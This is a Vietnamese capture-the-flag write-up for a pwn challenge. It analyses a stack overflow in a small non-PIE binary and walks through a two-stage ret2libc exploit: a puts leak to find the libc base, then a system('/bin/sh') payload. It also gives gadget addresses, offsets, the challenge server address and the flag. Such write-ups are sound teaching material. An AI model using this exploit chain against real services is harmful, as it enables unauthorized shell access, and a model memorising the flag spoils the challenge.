# Công nợ

**Category:** Pwn

## Đề bài

> ...cậu sv D25 ... đang sắp bị lừa khi phải đóng 1tr360/tín ... nếu chú chim giúp cậu ấy giải bài này thì cậu sẽ nói cho chú biết nơi cần đến.

ELF x86-64 (`chall`) + `libc.so.6` (GLIBC 2.39) + server `103.116.52.180:21673`.

## Phân tích

Binary **không PIE, không canary**, bị strip. Hàm `vuln` (`0x40115b`):

```asm
sub  rsp, 0x80          ; buf[0x80] tại rbp-0x80
puts(banner)
printf("> ")
read(0, rbp-0x80, 0x400) ; đọc 0x400 vào buffer 0x80 -> tràn stack
leave ; ret
```

Không có hàm `win`, kèm sẵn `libc.so.6` → bài **ret2libc**. Offset tới return address = `0x80 + 8 = 0x88`.

## Khai thác

**Tầng 1 — leak libc.** Dùng gadget `pop rdi; ret` (`0x401156`) gọi `puts(puts@got)` để in địa chỉ thật của `puts`, rồi return về `vuln` để overflow lần 2:

```
'A'*0x88 + pop_rdi + puts@got + puts@plt + vuln
```

Địa chỉ leak kết thúc bằng `0xcc0`, khớp `puts` trong libc kèm theo (offset `0x87cc0`) → tính `libc_base`.

**Tầng 2 — shell.** `system("/bin/sh")`:

```
'A'*0x88 + ret + pop_rdi + (base+/bin/sh) + (base+system)
```

Cần một gadget `ret` để căn stack về bội số 16 (nếu thêm `ret` thứ hai thì `system` chết ở lệnh `movaps`). Có shell rồi `cat /home/cong_no/flag.txt`.

Script: [`solve.py`](./solve.py) (dùng đúng `libc.so.6` trong `files/`)

```
$ python solve.py
libc base: 0x...
miniCTF{21.0521361_105.7772793_i_m1ss_h3r}
```

## Flag

```
miniCTF{21.0521361_105.7772793_i_m1ss_h3r}
```

Flag là toạ độ Hồ Tây, Hà Nội (`21.0521361, 105.7772793`) kèm "i m1ss h3r".
